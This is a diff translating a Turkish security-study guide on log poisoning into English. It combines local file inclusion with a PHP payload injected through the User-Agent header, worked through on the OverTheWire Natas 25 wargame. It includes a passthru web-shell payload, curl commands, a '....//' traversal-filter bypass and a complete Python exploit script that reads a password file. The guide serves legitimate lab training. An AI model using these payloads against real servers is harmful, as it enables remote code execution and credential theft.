@@ -1,114 +1,114 @@
-# 🌐 Web Güvenliği — Log Poisoning
+# 🌐 Web Security — Log Poisoning
 
-> Sunucu User-Agent gibi header'ları log dosyasına yazıyor.
-> LFI ile o log dosyasını include ederek PHP kodu çalıştırabilirsin.
-
----
-
-## 📋 İçindekiler
-
-- [Log Poisoning Nedir?](#log-poisoning-nedir)
-- [Apache Log Formatı](#apache-log-formatı)
-- [LFI + Log Poisoning Kombinasyonu](#lfi--log-poisoning-kombinasyonu)
-- [Natas'ta Kullanım](#natasta-kullanım)
+> The server writes headers like User-Agent to a log file.
+> With LFI, you can include that log file and run PHP code.
 
 ---
 
-## Log Poisoning Nedir?
+## 📋 Table of Contents
 
-İki zafiyetin kombinasyonudur:
+- [What Is Log Poisoning?](#what-is-log-poisoning)
+- [Apache Log Format](#apache-log-format)
+- [The LFI + Log Poisoning Combination](#the-lfi--log-poisoning-combination)
+- [Usage in Natas](#usage-in-natas)
 
-1. **LFI (Local File Inclusion)** — sunucu log dosyasını include edebiliyor
-2. **Log'a kod enjeksiyonu** — log dosyasına PHP kodu yazdırabiliyoruz
+---
+
+## What Is Log Poisoning?
+
+It's a combination of two vulnerabilities:
+
+1. **LFI (Local File Inclusion)** — the server can include a log file
+2. **Code injection into the log** — we can write PHP code into the log file
 
 ```
-Adım 1: User-Agent: <?php passthru($_GET['cmd']); ?>
-        → Sunucu bunu access.log'a yazar
+Step 1: User-Agent: <?php passthru($_GET['cmd']); ?>
+        → The server writes this to access.log
 
-Adım 2: ?page=../../../../var/log/apache2/access.log&cmd=id
-        → LFI ile log dosyası include edilir
-        → PHP kodu çalışır → komut çıktısı görünür
+Step 2: ?page=../../../../var/log/apache2/access.log&cmd=id
+        → The log file is included via LFI
+        → The PHP code runs → the command output appears
 ```
 
 ---
 
-## Apache Log Formatı
+## Apache Log Format
 
-Apache her isteği `access.log` dosyasına yazar:
+Apache writes every request to the `access.log` file:
 
 ```
 127.0.0.1 - - [01/Jan/2024:12:00:00 +0000] "GET / HTTP/1.1" 200 1234 "-" "Mozilla/5.0"
 ^           ^  ^                            ^               ^        ^    ^  ^
-IP          -  Tarih                        İstek           Status   Boyut Ref UA
+IP          -  Date                         Request         Status   Size Ref UA
 ```
 
-Son alan **User-Agent** — tarayıcı tarafından belirlenir ve doğrulanmadan log'a yazılır.
+The last field is the **User-Agent** — set by the browser and written to the log without validation.
 
-### Log Dosyası Konumları
+### Log File Locations
 
 ```
 /var/log/apache2/access.log     → Apache (Debian/Ubuntu)
 /var/log/apache/access.log      → Apache (CentOS/RHEL)
-/var/log/httpd/access_log       → Apache (CentOS alternatif)
+/var/log/httpd/access_log       → Apache (CentOS alternative)
 /var/log/nginx/access.log       → Nginx
 /proc/self/fd/2                 → Stderr
-/var/log/auth.log               → SSH auth logları (SSH üzerinden de poisoning olabilir)
+/var/log/auth.log               → SSH auth logs (poisoning is also possible via SSH)
 ```
 
 ---
 
-## LFI + Log Poisoning Kombinasyonu
+## The LFI + Log Poisoning Combination
 
-### Adım 1: Log Dosyasına PHP Kodu Yaz
+### Step 1: Write PHP Code into the Log File
 
 ```bash
-# User-Agent olarak PHP kodu gönder
+# Send PHP code as the User-Agent
 curl -A "<?php passthru(\$_GET['cmd']); ?>" \
-     http://hedef.com/index.php
+     http://target.com/index.php
 ```
 
-Bu istek `access.log`'a şöyle yazılır:
+This request is written to `access.log` like this:
 
 ```
 1.2.3.4 - - [01/Jan/2024:12:00:00] "GET / HTTP/1.1" 200 - "-" "<?php passthru($_GET['cmd']); ?>"
 ```
 
-### Adım 2: LFI ile Log Dosyasını Include Et
+### Step 2: Include the Log File via LFI
 
 ```
-http://hedef.com/index.php?page=../../../../var/log/apache2/access.log&cmd=id
+http://target.com/index.php?page=../../../../var/log/apache2/access.log&cmd=id
 ```
 
-PHP log dosyasını include ettiğinde `<?php passthru($_GET['cmd']); ?>` satırını bulur ve çalıştırır.
+When PHP includes the log file, it finds the `<?php passthru($_GET['cmd']); ?>` line and runs it.
 
-### Neden `$$_GET['cmd']` Değil `$_GET['cmd']`?
+### Why `$_GET['cmd']` and Not `$$_GET['cmd']`?
 
-curl komutunda `\$` kullanırız çünkü bash `$` karakterini değişken olarak yorumlar. PHP dosyasına `$_GET['cmd']` yazılmalıdır.
+In the curl command we use `\$` because bash interprets the `$` character as a variable. The PHP file should contain `$_GET['cmd']`.
 
 ```bash
-curl -A '<?php passthru($_GET["cmd"]); ?>'  # tek tırnak → $ korunur
+curl -A '<?php passthru($_GET["cmd"]); ?>'  # single quotes → $ is preserved
 ```
 
 ---
 
-## Natas'ta Kullanım
+## Usage in Natas
 
-### Natas 25 — Path Traversal Filtreli + Log Poisoning
+### Natas 25 — Filtered Path Traversal + Log Poisoning
 
-**Kaynak kod (özet):**
+**Source code (summary):**
 
 ```php
 function setLanguage() {
     if(array_key_exists("lang", $_REQUEST)) {
         $lang = $_REQUEST["lang"];
-        // ../ filtreleme girişimi
+        // attempt to filter ../
         $lang = str_replace('../', '', $lang);
         if(safeinclude($lang)) return 1;
     }
 }
 
 function safeinclude($filename) {
-    // natas_webpass içeriyorsa reddet
+    // reject if it contains natas_webpass
     if(strstr($filename, "natas_webpass")) {
         logRequest("file");
         return 0;
@@ -127,57 +127,57 @@ function logRequest($filename) {
 }
 ```
 
-**İki zafiyet:**
+**Two vulnerabilities:**
 
-1. `str_replace('../', '', $lang)` filtresi bypass edilebilir: `....//` → `../`
-2. `logRequest()` User-Agent'ı log'a yazıyor → PHP kodu enjekte edilebilir
-3. Log dosyası yolu LFI ile include edilebilir
+1. The `str_replace('../', '', $lang)` filter can be bypassed: `....//` → `../`
+2. `logRequest()` writes the User-Agent to the log → PHP code can be injected
+3. The log file path can be included via LFI
 
-**Exploit Adımları:**
+**Exploit Steps:**
 
-**Adım 1: `../` filtresini bypass et**
+**Step 1: Bypass the `../` filter**
 
 ```
-../     → str_replace → (silindi)
+../     → str_replace → (deleted)
 ....//  → str_replace → ../   ← bypass!
 ```
 
-**Adım 2: Log dosyasının yolunu bul**
+**Step 2: Find the log file path**
 
-Log dosyası: `/var/www/natas/natas25/logs/natas25_[PHPSESSID].log`
+Log file: `/var/www/natas/natas25/logs/natas25_[PHPSESSID].log`
 
-**Adım 3: Log dosyasına PHP kodu yaz**
+**Step 3: Write PHP code into the log file**
 
 ```bash
-curl -u natas25:[şifre] \
-     -b "PHPSESSID=benim_session_id" \
+curl -u natas25:[password] \
+     -b "PHPSESSID=my_session_id" \
      -A '<?php passthru($_GET["cmd"]); ?>' \
      "http://natas25.natas.labs.overthewire.org/?lang=natas_webpass"
-     # natas_webpass içerdiği için logRequest() tetiklenir!
+     # logRequest() is triggered because it contains natas_webpass!
 ```
 
-`natas_webpass` içerdiği için `safeinclude` reddeder VE `logRequest()` çağrılır → User-Agent log'a yazılır.
+Because it contains `natas_webpass`, `safeinclude` rejects it AND `logRequest()` is called → the User-Agent is written to the log.
 
-**Adım 4: LFI ile log dosyasını include et ve komutu çalıştır**
+**Step 4: Include the log file via LFI and run the command**
 
 ```bash
-curl -u natas25:[şifre] \
-     -b "PHPSESSID=benim_session_id" \
-     "http://natas25.natas.labs.overthewire.org/?lang=....//....//....//....//....//var/www/natas/natas25/logs/natas25_benim_session_id.log&cmd=cat+/etc/natas_webpass/natas26"
+curl -u natas25:[password] \
+     -b "PHPSESSID=my_session_id" \
+     "http://natas25.natas.labs.overthewire.org/?lang=....//....//....//....//....//var/www/natas/natas25/logs/natas25_my_session_id.log&cmd=cat+/etc/natas_webpass/natas26"
 ```
 
-**Python ile tam exploit:**
+**Full exploit with Python:**
 
 ```python
 import requests
 
 url      = "http://natas25.natas.labs.overthewire.org/"
 username = "natas25"
-password = "[natas25_şifresi]"
+password = "[natas25_password]"
 session_id = "my_custom_session"
 cookies  = {"PHPSESSID": session_id}
 
-# Adım 1: Log'a PHP kodu yaz (natas_webpass trigger'ı)
+# Step 1: Write PHP code into the log (natas_webpass trigger)
 r1 = requests.get(
     url,
     params={"lang": "natas_webpass"},
@@ -185,9 +185,9 @@ r1 = requests.get(
     headers={"User-Agent": '<?php passthru($_GET["cmd"]); ?>'},
     auth=(username, password)
 )
-print("[*] PHP kodu log'a yazıldı")
+print("[*] PHP code written to the log")
 
-# Adım 2: LFI ile log dosyasını include et
+# Step 2: Include the log file via LFI
 log_path = f"....//....//....//....//....//var/www/natas/natas25/logs/natas25_{session_id}.log"
 r2 = requests.get(
     url,
@@ -203,32 +203,32 @@ print(r2.text)
 
 ---
 
-### Log Poisoning — Kontrol Listesi
+### Log Poisoning — Checklist
 
 ```
-Tespit:
-  ☐ LFI var mı? (page, file, lang parametresi)
-  ☐ Log dosyasına erişilebiliyor mu? (include dene)
-  ☐ Hangi header'lar log'a yazılıyor? (User-Agent, Referer)
+Detection:
+  ☐ Is there LFI? (page, file, lang parameter)
+  ☐ Can the log file be accessed? (try to include it)
+  ☐ Which headers are written to the log? (User-Agent, Referer)
 
 Exploit:
-  ☐ Log dosyası yolunu bul
-  ☐ User-Agent olarak PHP payload gönder
-  ☐ LFI ile log dosyasını include et
-  ☐ &cmd= ile komut çalıştır
-  ☐ ../ filtreleniyorsa ....// ile bypass et
+  ☐ Find the log file path
+  ☐ Send a PHP payload as the User-Agent
+  ☐ Include the log file via LFI
+  ☐ Run a command with &cmd=
+  ☐ If ../ is filtered, bypass it with ....//
 ```
 
 ---
 
-## 🔗 Kaynaklar
+## 🔗 Resources
 
 - [PortSwigger — Log File Injection](https://portswigger.net/web-security/file-path-traversal)
 - [PayloadsAllTheThings — LFI to RCE via Log](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion#lfi-to-rce-via-apache-log-poisoning)
 
 ---
 
-**Önceki konu:** [22_perl_cgi_param_bypass.md](./22_perl_cgi_param_bypass.md)
-**Sonraki konu:** [24_phar_deserialization.md](./24_phar_deserialization.md)
+**Previous topic:** [22_perl_cgi_param_bypass.md](./22_perl_cgi_param_bypass.md)
+**Next topic:** [24_phar_deserialization.md](./24_phar_deserialization.md)
 
-*Bu rehber [waitaseC137/linux_learning](https://github.com/waitaseC137/linux_learning) reposunun bir parçasıdır.*
+*This guide is part of the [waitaseC137/linux_learning](https://github.com/waitaseC137/linux_learning) repository.*
